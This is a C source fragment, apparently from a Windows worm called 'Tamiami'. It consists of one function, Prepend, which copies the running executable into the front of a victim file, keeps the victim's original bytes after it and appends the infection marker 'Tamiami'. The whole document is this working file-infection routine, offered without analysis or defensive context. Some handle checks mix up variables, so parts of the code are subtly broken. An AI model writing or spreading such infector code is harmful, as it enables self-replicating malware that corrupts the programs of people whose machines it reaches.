   bool Prepend(char FileToInfect[])
   {
       char        InfectionMarker[] = "Tamiami";
       char        WormFile[MAX_PATH];
       HANDLE      WormHandle;
       HGLOBAL     WormMem;
       LPVOID      WormMemStart;
       DWORD       BytesRead;
       DWORD       BytesWrite;
       HANDLE      VictimHandle;
       DWORD       VictimSize;
       HGLOBAL     VictimMem;
       LPVOID      VictimMemStart;

       if(GetModuleFileName(0, WormFile, sizeof(WormFile)) != 0)
       {
           WormHandle = CreateFile(WormFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

           if(WormFile != INVALID_HANDLE_VALUE)
           {
               WormMem = GlobalAlloc(GMEM_MOVEABLE, TamiamiSize);
               WormMemStart = GlobalLock(WormMem);

               if(WormMem != 0 && WormMemStart != 0)
               {
                   if(ReadFile(WormHandle, WormMemStart, TamiamiSize, &BytesRead, 0) != 0)
                   {
                       CloseHandle(WormHandle);

                       VictimHandle = CreateFile(FileToInfect, GENERIC_READ + GENERIC_WRITE, FILE_SHARE_READ + FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

                       if(VictimHandle != INVALID_HANDLE_VALUE)
                       {
                           VictimSize = GetFileSize(VictimHandle, 0);

                           if(VictimSize != 0)
                           {
                               VictimMem = GlobalAlloc(GMEM_MOVEABLE, VictimSize);
                               VictimMemStart = GlobalLock(VictimMem);

                               if(VictimMem != 0 && VictimMemStart != 0)
                               {
                                   if(ReadFile(VictimHandle, VictimMemStart, VictimSize, &BytesRead, 0) != 0)
                                   {
                                       if(SetFilePointer(VictimHandle, 0, 0, FILE_BEGIN) != 0xFFFFFFFF)
                                       {
                                           if(WriteFile(VictimHandle, WormMemStart, TamiamiSize, &BytesWrite, 0) != 0 &&
                                              WriteFile(VictimHandle, VictimMemStart, VictimSize, &BytesWrite, 0) != 0 &&
                                              WriteFile(VictimHandle, InfectionMarker, lstrlen(InfectionMarker), &BytesWrite, 0) != 0)
                                           {
                                               CloseHandle(VictimHandle);
                                               GlobalUnlock(VictimMem);
                                               GlobalFree(VictimMem);
                                               GlobalUnlock(WormMem);
                                               GlobalFree(WormMem);

                                               return true;
                                           }
                                       }
                                   }

                                   GlobalUnlock(VictimMem);
                                   GlobalFree(VictimMem);
                               }
                           }

                           CloseHandle(VictimHandle);
                       }
                   }

                   GlobalUnlock(WormMem);
                   GlobalFree(WormMem);
               }

               CloseHandle(WormFile);
           }
       }

       return false;
   }
